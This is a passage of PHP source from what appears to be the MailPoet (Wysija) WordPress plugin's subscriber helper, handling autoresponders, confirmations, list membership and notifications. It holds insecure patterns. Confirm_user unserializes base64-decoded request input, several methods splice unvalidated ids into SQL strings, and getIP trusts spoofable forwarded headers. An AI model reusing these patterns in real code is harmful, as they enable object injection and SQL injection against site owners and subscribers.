                    $this->uid = $user_id;
                    if (!$backend)
                        $this->_notify($data['user']['email'], true, $data['user_list']['list_ids']);
                }
            }
            if ($sendAutonl) {
                $lists = $this->getUserLists($user_id, $data['user_list']['list_ids']);
                $this->sendAutoNl($user_id, $lists, 'subs-2-nl', $backend);
            }
        }

        return $user_id;
    }

    /**
     * send auto nl based on the params passed
     * @staticvar type $emails
     * @param int $user_id
     * @param mixed $params_based_on_type the params which are needed for this type of newsletter
     * @param string $process_type the type of auto newsletter that needs to be processed
     * @param boolean $added_by_admin to make the distinction between subscribers added through the admin interface or not
     * @return boolean
     */
    function sendAutoNl($user_id, $params_based_on_type = false, $process_type = 'subs-2-nl', $added_by_admin = false) {

        // check that the user we're trying to send the newsletter to has the right status
        $modelUser=WYSIJA::get('user','model');
        $modelC=WYSIJA::get('config','model');
        $dbloptin=(int)$modelC->getValue('confirm_dbleoptin');

        // we send an autonl if the subscriber is not added to the list by the admin and the user's status is greater or equal to 0 or 1 (if a user switch from double optin to single optin the greater or equal suddenly make sense)
        if(!$added_by_admin && !$modelUser->exists( array( 'equal' => array( 'user_id' => $user_id ), 'greater_eq' => array( 'status' => $dbloptin )))){
            return false;
        }

        $userListss = array();
        if($dbloptin && !$added_by_admin){
            $modelUserList=WYSIJA::get('user_list','model');
            $userListssres=$modelUserList->get(array('list_id'),array('equal'=>array('user_id'=>$user_id),'greater'=>array('sub_date'=>0)));
            foreach($userListssres as $res){
                $userListss[]=$res['list_id'];
            }
        }elseif(!$dbloptin){
            // in the case where double optin is off we're filling an array of lists from which the subscriber could receive autoresponders
            $modelUserList = WYSIJA::get('user_list','model');
            $userListssres = $modelUserList->get(array('list_id'),array('equal'=>array('user_id'=>$user_id)));
            foreach($userListssres as $res){
                $userListss[] = $res['list_id'];
            }
        }

        // loading active automatic emails
        static $emails;
        if (empty($emails)) {
            $modelEmail = WYSIJA::get('email', 'model');
            $modelEmail->reset();
            $emails = $modelEmail->get(false, array('type' => 2, 'status' => array(1, 3, 99)));
            if (is_object($emails)) {
                $emailarr = null;
                foreach ($emails as $keyob => $valobj) {
                    $emailarr[$keyob] = $valobj;
                }
                $emails = $emailarr;
            }
            if (is_array($emails) && isset($emails['body']))
                $emails = array($emails);
        }


        foreach ($emails as $key => $email) {
            if ($email['params']['autonl']['event'] != $process_type)
                continue;
            switch ($process_type) {
                case 'subs-2-nl':
                    // extra params in that case is an array of lists
                    foreach ($params_based_on_type as $details) {

                        if (isset($email['params']['autonl']['subscribetolist']) && isset($details['list_id']) && $email['params']['autonl']['subscribetolist'] == $details['list_id']) {
                            $ok = true;
                            if (!$added_by_admin && $dbloptin && !in_array($details['list_id'], $userListss)) {
                                // make sure the list has sub_date
                                $ok = false;
                            }

                            if ($ok)
                                $this->insertAutoQueue($user_id, $email['email_id'], $email['params']['autonl']);
                        }
                    }

                    break;
                case 'new-user':
                    // extra params in that case is a user object
                    $okInsert = false;
                    switch ($email['params']['autonl']['roles']) {
                        case 'any':
                            $okInsert = true;
                            break;
                        default:
                            foreach ($params_based_on_type->roles as $rolename) {
                                if ($rolename == $email['params']['autonl']['roles'])
                                    $okInsert = true;
                            }

                            break;
                    }
                    if ($okInsert)
                        $this->insertAutoQueue($user_id, $email['email_id'], $email['params']['autonl']);
                    break;
            }
        }
    }

    /**
     * this is used when we want to send the email immediately after inserting it into the queue
     * @param int $user_id
     * @param int $email_id
     * @param array $email_params_autonl
     * @return void
     */
    function insertAutoQueue($user_id, $email_id, $email_params_autonl) {
        $model_queue = WYSIJA::get('queue', 'model');
        $queueData = array('priority' => '-1', 'email_id' => $email_id, 'user_id' => $user_id);

        $delay = $model_queue->calculate_delay($email_params_autonl);

        $queueData['send_at'] = time() + $delay;

        // if the email is already queued for that autoresponder, we don't queue it
        if(!$model_queue->exists(array('email_id'=>$email_id,'user_id'=>$user_id))){
            // if the email has already been sent and is now in the stat table, we don't queue it either
            $modelEUS = WYSIJA::get('email_user_stat','model');
            if(!$modelEUS->exists(array('email_id'=>$email_id,'user_id'=>$user_id))){
                $model_queue->insert($queueData,true);
            }

        }

        //if delay is = to 0 then we need to try to send the email straight away
        if ($delay == 0) {
            $queueH = WYSIJA::get('queue', 'helper');
            $queueH->report = false;
            WYSIJA::log('insertAutoQueue queue process', array('email_id' => $email_id, 'user_id' => $user_id), 'queue_process');
            $queueH->process($email_id, $user_id);
        }
    }

    /**
     * unsubscribe a user
     * @param type $user_id
     * @param type $auto
     * @return type
     */
    function unsubscribe($user_id, $auto = false) {
        return $this->subscribe($user_id, false, $auto);
    }

    /**
     * Undo the action "unsubscribe" by a mistake
     * @param type $user_id
     * @param type $auto
     */
    function undounsubscribe($user_id, $auto = false) {
        return $this->subscribe($user_id, true, $auto);
    }

    /**
     * send confirmation email
     * @param type $user_ids
     * @param type $sendone
     * @param type $listids
     * @return boolean
     */
    function sendConfirmationEmail($user_ids, $sendone = false, $listids = array()) {
        if ($this->no_confirmation_email === true)
            return;

        if ($sendone || is_object($user_ids)) {
            /* in this case user_ids is just one user object */
            $users = array($user_ids);
        } else {
            if (!is_array($user_ids)) {
                $user_ids = (array) $user_ids;
            }
            /* get users objects */
            $modelU = WYSIJA::get('user', 'model');
            $modelU->getFormat = OBJECT_K;
            $users = $modelU->get(false, array('equal' => array('user_id' => $user_ids, 'status' => 0)));
        }

        $config = WYSIJA::get('config', 'model');
        $mailer = WYSIJA::get('mailer', 'helper');

        //check if there are lists
        if ($listids) {
            $mailer->listids = $listids;
            $mList = WYSIJA::get('list', 'model');
            $listnamesarray = $mList->get(array('name'), array('list_id' => $listids));
            $arrayNames = array();
            foreach ($listnamesarray as $detailname) {
                $arrayNames[] = $detailname['name'];
            }
            $mailer->listnames = $arrayNames;
        }

        //load confirmation email, and if it doesn't exists create a new one
        $mEmail = WYSIJA::get('email', 'model');
        $mEmail->getFormat = OBJECT;
        $emailConfirmationData = $mEmail->getOne(false, array('email_id' => $config->getValue('confirm_email_id')));

        if (empty($emailConfirmationData)) {
            //somehow the confirmation email has been lost so we need to create a new one
            $dataEmailCon = array('from_name' => $config->getValue('from_name'), 'from_email' => $config->getValue('from_email'),
                'replyto_name' => $config->getValue('replyto_name'), 'replyto_email' => $config->getValue('replyto_email'),
                'subject' => $config->getValue('confirm_email_title'), 'body' => $config->getValue('confirm_email_body'), 'type' => '0', 'status' => '99');

            $confemailid = $mEmail->insert($dataEmailCon);
            if ($confemailid)
                $config->save(array('confirm_email_id' => $confemailid));

            $mEmail->reset();

            $mEmail->getFormat = OBJECT;
            $emailConfirmationData = $mEmail->getOne(false, array('email_id' => $config->getValue('confirm_email_id')));
        }

        foreach ($users as $userObj) {
            $resultsend = $mailer->sendOne($emailConfirmationData, $userObj, true);
        }

        if (!$sendone)
            $this->notice(sprintf(__('%1$d emails have been sent to unconfirmed subscribers.', WYSIJA), count($users)));
        else
            return $resultsend;
        return true;
    }

    /**
     * Get all unconfirmed subscribers.
     * @param
     * @return Array $unconfirmed_ids Array with all the IDs of unconfirmed subscribers.
     */
    function get_unconfirmed_subscribers() {

        // Get all unconfirmed users ids.
        $model_user = WYSIJA::get('user', 'model');
        $query = 'SELECT user_id
                  FROM ' . '[wysija]' . $model_user->table_name . '
                  WHERE  status = 0';
        $result = $model_user->query('get_res', $query);

        // Convert the array to a simple ids array.
        $unconfirmed_subscribers = array();
        foreach ($result as $unconfirmed_user) {
            $unconfirmed_subscribers[] = $unconfirmed_user['user_id'];
        }

        return $unconfirmed_subscribers;
    }

    /**
     * bulk delete users
     * @param type $user_ids
     * @param type $sendone
     * @return boolean
     */
    function delete($user_ids, $sendone = false, $is_batch_select = false) {
        $list_user_ids = null; // list of user ids to query, in a list or sub-query
        $user_model = WYSIJA::get('user', 'model');
        if ($sendone) {
            // actually, this case is not implemeted yet
            // in this case user_ids is just one user object
            // $users=array($user_ids);
            exit('Not implemented! Please contact mailpoet.com');
        } elseif ($is_batch_select) {
            // in this case $users_ids = an associated array('query', 'from', 'select', ...etc)
            $list_user_ids = $user_ids['query'];
        } else {
            if (!is_array($user_ids)) {
                $user_ids = (array) $user_ids;
            }
            $list_user_ids = implode(',', $user_ids);
        }
        // table queue to delete
        $tables = array(
            'user_history',
            'email_user_url',
            'email_user_stat',
            'user_list',
            'queue',
            'user'
        );
        try {
            foreach ($tables as $table_name) {
                $query = 'DELETE FROM [wysija]' . $table_name . ' WHERE user_id IN (' . $list_user_ids . ')';
                $user_model->query($query);
            }
        } catch (Exception $e) {
            return false;
        }
        return true;
    }

    /**
     * add many subsribers to one list
     * @param int $list_id
     * @param int $user_ids
     * @return boolean
     */
    function addToList($list_id, $user_ids, $is_batch_select = false) {
        $model_user = WYSIJA::get('user', 'model');
        $sub_date = time();
        if (!$is_batch_select) {
            $total = count($user_ids);
            $list_user_ids = implode(',', $user_ids);
            $query = 'REPLACE INTO `[wysija]user_list` (`list_id`,`user_id`,`sub_date`) VALUES ';
            foreach ($user_ids as $key => $uid) {
                $query .= '(' . (int) $list_id . ',' . (int) $uid . ',' . $sub_date . ")\n";
                if ($total > ($key + 1))
                    $query.=',';
            }
        }else {
            $list_user_ids = $user_ids['query'];
            $query = 'REPLACE INTO `[wysija]user_list` (`list_id`,`user_id`,`sub_date`)
                            SELECT ' . $list_id . ' AS `list_id`, `user_id` AS `user_id`, ' . $sub_date . ' AS `sub_date` ' . $user_ids['from'];
        }
        return $model_user->query($query);
    }

    /**
     * add one subscribers to some lists
     * @param array $list_ids
     * @param int $user_id
     * @param int $subscribed_at
     * @return boolean
     */
    function addToLists($list_ids, $user_id, $subscribed_at = 0) {

        if (empty($list_ids)) {
            // don't add subscriber to lists if no list ids specified
            return false;
        }

        $modelUser = WYSIJA::get('user', 'model');
        $extraFieldsName = $extraFieldsVal = '';
        if ($subscribed_at) {
            $extraFieldsName = ',`sub_date`';
            $extraFieldsVal = ',' . $subscribed_at;
        }
        $query = 'INSERT IGNORE INTO `[wysija]user_list` (`list_id`,`user_id`' . $extraFieldsName . ')';
        $query.=' VALUES ';
        $total = count($list_ids);
        foreach ($list_ids as $key => $listid) {
            $query.='(' . (int) $listid . ',' . (int) $user_id . $extraFieldsVal . ")\n";
            if ($total > ($key + 1))
                $query.=',';
        }

        return $modelUser->query($query);
    }

    /**
     * Move bulk users to a list
     * @param int $listid
     * @param array $userids = array(int,int,int,...) OR array('where'=>'', 'from'=>'', 'select'=>'', 'query'=>'', 'row_counts_query'=>'')
     * @return type
     */
    function moveToList($listid, $userids, $is_batch_select = false) {
        //1. Remove from all existing list
        $frozen_list = $this->_getHiddenLists();
        if (empty($frozen_list))
            $frozen_list_where = '';
        else
            $frozen_list_where = ' AND `list_id` NOT IN (' . implode(',', $frozen_list) . ')';
        if (!$is_batch_select)
            $userids_query = implode(',', $userids);
        else
            $userids_query = $userids['query'];
        $query1 = 'DELETE FROM `[wysija]user_list` WHERE `user_id` IN (' . $userids_query . ')' . $frozen_list_where;

        //2. Add to the new list
        $sub_date = time();
        if (!$is_batch_select) {
            $records = array();
            foreach ($userids as $key => $uid) {
                $records[] = implode(',', array($listid, $uid, $sub_date));
            }
            $values = '(' . implode('),(', $records) . ');';
            $query2 = 'INSERT INTO `[wysija]user_list` (`list_id`,`user_id`,`sub_date`) VALUES ' . $values;
        } else {
            $query2 = 'INSERT INTO `[wysija]user_list` (`list_id`,`user_id`,`sub_date`)
                            SELECT ' . $listid . ' AS `list_id`, `user_id` AS `user_id`, ' . $sub_date . ' AS `sub_date` ' . $userids['from'];
        }

        //3. Execute
        $model_user = WYSIJA::get('user', 'model');
        $model_user->query($query1);
        $model_user->query($query2);
        return true;
    }

    /**
     * Remove user(s) from list(s)
     * @param array $listids
     * @param array $userids
     * @return boolean
     */
    function removeFromLists($listids = array(), $userids = array(), $is_batch_select = false) {
        if (empty($userids) || (empty($listids) && empty($userids)))
            return true;
        if ($is_batch_select)
            $list_userids = $userids['query'];
        else
            $list_userids = implode(',', $userids);

        $frozen_list = $this->_getHiddenLists();
        if (empty($frozen_list)) {
            $frozen_list_where = '';
        } else {
            $frozen_list_where = ' AND `list_id` NOT IN (' . implode(',', $frozen_list) . ')';
        }

        if (empty($listids)) {//remove from all lists
            $query = 'DELETE FROM `[wysija]user_list` WHERE `user_id` IN (' . $list_userids . ')';
        } else { // remove from specific lists
            $list_listids = implode(',', $listids);
            $query = 'DELETE FROM `[wysija]user_list` WHERE `user_id` IN (' . $list_userids . ') AND `list_id` IN (' . $list_listids . ')';
        }
        $query .= $frozen_list_where;

        //Execute
        $model_user = WYSIJA::get('user', 'model');
        return $model_user->query($query);
    }

    /**
     * Bulk confirm user(s)
     * @param array $userids
     * @return boolean
     */
    function confirmUsers($userids = array(), $is_batch_select = false) {
        if (empty($userids))
            return true;
        $model_user = WYSIJA::get('user', 'model');
        if ($is_batch_select) {
            $count = $model_user->query('get_row', $userids['count_query']);
            $row_count = $count['row_count'];
            $list_userids = $userids['query'];
        } else {
            $list_userids = implode(',', $userids);
            $row_count = !empty($_REQUEST['wysija']['user']['user_id']) ? count($_REQUEST['wysija']['user']['user_id']) : 0;
        }
        $query1 = 'UPDATE `[wysija]user` SET status = 1 WHERE `user_id` IN (' . $list_userids . ')';
        $query2 = 'UPDATE `[wysija]user_list` SET sub_date  = ' . time() . ', unsub_date = 0  WHERE `user_id` IN (' . $list_userids . ')';

        //Execute
        $model_user->query($query1);
        $model_user->query($query2);
        return $row_count;
    }

    /**
     * Get hidden lists (typically Wordpress user list)
     * @return array(int, int)
     */
    function _getHiddenLists() {
        $result = WYSIJA::get('user', 'model')->getResults('SELECT GROUP_CONCAT(`list_id`) as ids FROM `[wysija]list` WHERE `is_enabled` = 0');
        return $result[0]['ids'] ? explode(',', $result[0]['ids']) : array();
    }

    /**
     * send Admin notification about new subscriber or new unsubscribed user
     * @param type $email
     * @param type $subscribed
     * @param type $list_ids
     */
    function _notify($email, $subscribed = true, $list_ids = false) {
        // get the public list to which user is subscribed
        $model_user = WYSIJA::get('user_list', 'model');

        if ($list_ids) {
            $query = "Select B.name from `[wysija]list` as B where B.list_id IN ('" . implode("','", $list_ids) . "') and B.is_enabled>0";
        } else {
            $query = 'Select B.name from `[wysija]user_list` as A join `[wysija]list` as B on A.list_id=B.list_id where A.user_id=' . $this->uid . ' and B.is_enabled>0';
        }

        $result = $model_user->query('get_res', $query);
        $list_names = array();
        foreach ($result as $arra) {
            $list_names[] = $arra['name'];
        }

        if ($subscribed) {
            $title = sprintf(__('New subscriber to %1$s', WYSIJA), implode(',', $list_names));
            $body = sprintf(__('Howdy,' . "\n\n" . 'The subscriber %1$s has just subscribed to your list "%2$s".' . "\n\n" . 'Cheers,' . "\n\n" . 'The MailPoet Plugin', WYSIJA), "<strong>" . $email . "</strong>", "<strong>" . implode(',', $list_names) . "</strong>");
        } else {
            $title = sprintf(__('One less subscriber to %1$s', WYSIJA), implode(',', $list_names));
            $body = sprintf(__('Howdy,' . "\n\n" . 'The subscriber : %1$s has just unsubscribed to your list "%2$s".' . "\n\n" . 'Cheers,' . "\n\n" . 'The MailPoet Plugin', WYSIJA), "<strong>" . $email . "</strong>", "<strong>" . implode(',', $list_names) . "</strong>");
        }

        $model_config = WYSIJA::get('config', 'model');
        $mailer = WYSIJA::get('mailer', 'helper');
        $notifieds = $model_config->getValue('emails_notified');
        //$mailer->report=false;
        $notifieds = explode(',', $notifieds);
        $mailer->testemail = true;
        $body = nl2br($body);
        foreach ($notifieds as $receiver) {
            $mailer->sendSimple(trim($receiver), $title, $body);
        }
    }

    /**
     * refresh all related info of users
     * @return boolean
     */
    function refreshUsers() {
        $model_user = WYSIJA::get('user', 'model');
        $model_user->reset();
        $model_config = WYSIJA::get('config', 'model');
        if ($model_config->getValue('confirm_dbleoptin')) {
            $model_user->setConditions(array('greater' => array('status' => 0)));
        } else {
            $model_user->setConditions(array('greater' => array('status' => -1)));
        }

        $count = $model_user->count();
        $model_config->save(array('total_subscribers' => $count));
        return true;
    }

    /**
     * Regenerate domains based on users' emails
     */
    public function generate_domains() {
        $query = "UPDATE [wysija]user SET `domain` = SUBSTRING(`email`,LOCATE('@',`email`)+1) WHERE ISNULL(`domain`)";
        $model_user = WYSIJA::get('user', 'model');
        return $model_user->query($query);
    }

    /**
     * function used to update the synchronisation with a plugin list or WP's one table
     * @global object $wpdb
     * @param int $list_id
     * @param boolean $synch_all_wp_user_base means complete synch of the whole user base, it's used for multisite and the WordPress users list
     * @return type
     */
    function synchList($list_id, $synch_all_wp_user_base = false) {
        $model = WYSIJA::get('list', 'model');
        $data = $model->getOne(false, array('list_id' => (int) $list_id, 'is_enabled' => '0'));

        if ($data) {

            if (strpos($data['namekey'], '-listimported-') !== false) {
                // plugins list table synch
                $model->reset();

                // import synch list
                $listdata = explode('-listimported-', $data['namekey']);
                $dataMainList = $model->getOne(false, array('namekey' => $listdata[0], 'is_enabled' => '0'));

                $importHelper = WYSIJA::get('plugins_import', 'helper');
                $connection_info = $importHelper->getPluginsInfo($listdata[0]);
                $lists_ids = array(
                    'wysija_list_main_id' => $dataMainList['list_id'],
                    'wysija_list_id' => $data['list_id'],
                    'plug_list_id' => $listdata[1]
                );
                $importHelper->import($listdata[0], $connection_info, false, false, $lists_ids);
            } elseif ($data['namekey'] == 'users') {
                // wordpress user table synch
                //importwp
                $ismainsite = true;
                if (is_multisite()) {
                    global $wpdb;
                    if ($wpdb->prefix != $wpdb->base_prefix) {
                        $ismainsite = false;
                    }
                }

                $connection_info = array('name' => 'WordPress',
                    'pk' => 'ID',
                    'matches' => array('ID' => 'wpuser_id', 'user_email' => 'email', 'first_name' => 'firstname', 'last_name' => 'lastname'),
                    'matchesvar' => array('status' => 1));

                $importHelper = WYSIJA::get('plugins_import', 'helper');
                $lists_ids = array(
                    'wysija_list_main_id' => $data['list_id']
                );

                $importHelper->import($data['namekey'], $connection_info, false, $synch_all_wp_user_base, $lists_ids);

                $this->cleanWordpressUsersList();
            } elseif (strpos($data['namekey'], 'query-') !== false) {
                // special query look for an action to run the refresh
                //TODO maybe we don't need to create a list that we sync but simply need a way to make a filter
                $queryUid = apply_filters('wysija_synch_' . str_replace('-', '_', $data['namekey']));
                $importHelper = WYSIJA::get('plugins_import', 'helper');
                $queryUid = str_replace(array('[list_id]', '[created_at]'), array($data['list_id'], time()), $queryUid);
                $importHelper->insertUserList(0, 0, 0, $queryUid);
            } else {
                // plugins table synch

                $config = WYSIJA::get('config', 'model');
                $importables = $config->getValue('pluginsImportableEgg');

                if (in_array($data['namekey'], array_keys($importables))) {
                    $importHelper = WYSIJA::get('plugins_import', 'helper');
                    $dataMainList = $model->getOne(false, array('namekey' => $data['namekey'], 'is_enabled' => '0'));

                    $importHelper->import($data['namekey'], $importHelper->getPluginsInfo($data['namekey']), false, false, array('wysija_list_main_id' => $dataMainList['list_id']));
                }
            }
            $this->notice(sprintf(__('List "%1$s" has been synchronised.', WYSIJA), $data['name']));
            return true;
        } else {
            $this->error(__('The list does not exists or cannot be synched.', WYSIJA), true);
            return false;
        }
    }

    /**
     * function used to cleanup the lost wpuser_id
     * @return boolean
     */
    function cleanWordpressUsersList() {
        // update the screwed up wpuser_id
        $model_list = WYSIJA::get('list', 'model');
        $query = 'UPDATE [wysija]user as A JOIN [wp]users as B on A.email=B.user_email SET A.wpuser_id = B.ID WHERE A.wpuser_id = 0';
        $model_list->query($query);

        // get all the wysija user with a wpuser_id >0 and insert them into the WordPress user list
        $model_config = WYSIJA::get('config', 'model');
        $selectuserCreated = 'SELECT [wysija]user.user_id, ' . $model_config->getValue('importwp_list_id') . ', ' . time() . ' FROM [wysija]user WHERE wpuser_id > 0';
        $query = 'INSERT IGNORE INTO `[wysija]user_list` (`user_id`,`list_id`,`sub_date`) ' . $selectuserCreated;
        $model_list->reset();
        $model_list->query($query);
        return true;
    }

    /**
     * get an IP for the current visitor/user
     * @return string IP address
     */
    function getIP() {
        $ip = '';

        // cloudFlare IP check
        if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
            $ip = strip_tags($_SERVER['HTTP_CF_CONNECTING_IP']);
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']) AND strlen($_SERVER['HTTP_X_FORWARDED_FOR']) > 6) {
            $ip = strip_tags($_SERVER['HTTP_X_FORWARDED_FOR']);
        } elseif (!empty($_SERVER['HTTP_CLIENT_IP']) AND strlen($_SERVER['HTTP_CLIENT_IP']) > 6) {
            $ip = strip_tags($_SERVER['HTTP_CLIENT_IP']);
        } elseif (!empty($_SERVER['REMOTE_ADDR']) AND strlen($_SERVER['REMOTE_ADDR']) > 6) {
            $ip = strip_tags($_SERVER['REMOTE_ADDR']);
        }//endif
        if (empty($ip))
            $ip = '127.0.0.1';
        return strip_tags($ip);
    }

    /**
     * verify that an email string is valid
     * @param string $email
     * @return boolean
     */
    function validEmail($email) {
        //1 - check if the email parameter looks like an email
        if (empty($email) || !is_string($email) || strpos($email, '@') === false)
            return false;

        //2 - pregmatch the email
        $check_domain = false;
        $preg_check = true;
        $string_special_chars = '\\\\\\';
        $email_pattern = '/^([a-z0-9_\'&\.\-\+' . $string_special_chars . '])+\@(([a-z0-9\-' . $string_special_chars . '])+\.)+([a-z0-9\-' . $string_special_chars . ']{2,10})+$/i';
        //$string_special_chars = '';
        $model_config = WYSIJA::get('config', 'model');
        if ($model_config->getValue('email_cyrillic')) {
            // check domain
            $preg_check = false;
        }

        if ($model_config->getValue('check_domain')) {
            // check domain
            $check_domain = true;
        }

        if ($preg_check) {
            if (!preg_match($email_pattern, $email))
                return false;
        }


        if ($check_domain) {
            //3 - make sure the domain of the email exists
            $helper_toolbox = WYSIJA::get('toolbox', 'helper');

            if (!$helper_toolbox->check_email_domain($email))
                return false;
        }
        return true;
    }

    /**
     * make sure that the request wysija-key parameter correspond to a user in the db
     * @return boolean
     */
    function checkUserKey($user_id = false) {

        // the !is numeric condition is here because if we input wysija-key=3 in the url
        // our model will search keyuser=3 which will return the result of the user with key user 3b61ac508456ab6ee7594c47cddb86a5
        if((!empty($_REQUEST['wysija-key']) && !is_numeric($_REQUEST['wysija-key'])) || $user_id !==false){
            $modelUser=WYSIJA::get('user','model');

            if ($user_id === false) {
                $where_condition = array('keyuser' => $_REQUEST['wysija-key']);
            } else {
                $where_condition = array('user_id' => $user_id);
            }

            $result = $modelUser->getDetails($where_condition);
            if ($result) {
                return $result;
            } else {
                $this->error(__('Page is not accessible.', WYSIJA), true);
                return false;
            }
        } else {
            $this->error(__('Page is not accessible.', WYSIJA), true);
            return false;
        }
    }

    /**
     * get all of the lists a user has subscribed to
     * @param int $user_id
     * @param array $list_ids
     * @return array results
     */
    function getUserLists($user_id, $list_ids = array()) {
        $model_user = WYSIJA::get('user', 'model');
        $list_id_in = '';
        if (!empty($list_ids))
            $list_id_in = "AND A.list_id IN(" . implode(",", $list_ids) . ")";
        $query = 'SELECT A.* FROM [wysija]user_list as A LEFT JOIN [wysija]list as B on A.list_id=B.list_id WHERE A.user_id=' . $user_id . ' AND B.is_enabled=1 ' . $list_id_in;
        return $model_user->getResults($query);
    }

    /**
     * if we confirm the user manually we pass it a user_id otherwise it works with a global key
     * @param type $user_id
     * @return boolean
     */
    function confirm_user($user_id = false) {
        $model_config = WYSIJA::get('config', 'model');
        // we need to call the translation otherwise it will not be loaded and translated
        $model_config->add_translated_default();

        $list_ids = array();
        if (isset($_REQUEST['wysiconf']))
            $list_ids = unserialize(base64_decode($_REQUEST['wysiconf']));

        // START part linked to the view
        $this->title = $model_config->getValue('subscribed_title');
        if (!empty($list_ids)) {
            $model_list = WYSIJA::get('list', 'model');
            $lists_names_res = $model_list->get(array('name'), array('list_id' => $list_ids));
            $names = array();
            foreach ($lists_names_res as $nameob)
                $names[] = $nameob['name'];

            if (!isset($model_config->values['subscribed_title']))
                $this->title = __('You\'ve subscribed to: %1$s', WYSIJA);
            $this->title = sprintf($this->title, implode(', ', $names));
        }

        $this->subtitle = $model_config->getValue('subscribed_subtitle');
        if (!isset($model_config->values['subscribed_subtitle']))
            $this->subtitle = __("Yup, we've added you to our list. You'll hear from us shortly.", WYSIJA);
        // END part linked to the view

        $user_data = $this->checkUserKey($user_id);

        if ($user_data) {
            //user is not confirmed yet
            $model_config = WYSIJA::get('config', 'model');
            if ((int) $user_data['details']['status'] < 1) {
                // let's confirm the subscriber
                $this->subscribe($user_data['details']['user_id'], true, false, $list_ids);
                $this->uid = $user_data['details']['user_id'];

                // send a notification to the email specified in the settings if required to
                if ($model_config->getValue('emails_notified') && $model_config->getValue('emails_notified_when_sub')) {
                    $this->_notify($user_data['details']['email']);
                }
                return true;
            } else {
                if (isset($_REQUEST['wysiconf'])) {
                    $needs_subscription = false;
                    foreach ($user_data['lists'] as $list) {
                        if (in_array($list['list_id'], $list_ids) && (int) $list['sub_date'] < 1) {
                            $needs_subscription = true;
                        }
                    }

                    if ($needs_subscription) {
                        $this->subscribe($user_data['details']['user_id'], true, false, $list_ids);
                        $this->title = sprintf($model_config->getValue('subscribed_title'), implode(', ', $names));
                        $this->subtitle = $model_config->getValue('subscribed_subtitle');
                        // send a notification to the email specified in the settings if required to
                        if ($model_config->getValue('emails_notified') && $model_config->getValue('emails_notified_when_sub')) {
                            $this->_notify($user_data['details']['email'], true, $list_ids);
                        }
                    } else {
                        $this->title = sprintf(__('You are already subscribed to : %1$s', WYSIJA), implode(', ', $names));
                    }
                } else {
                    $this->title = __('You are already subscribed.', WYSIJA);
                }
                return true;
            }
        }
    }
}
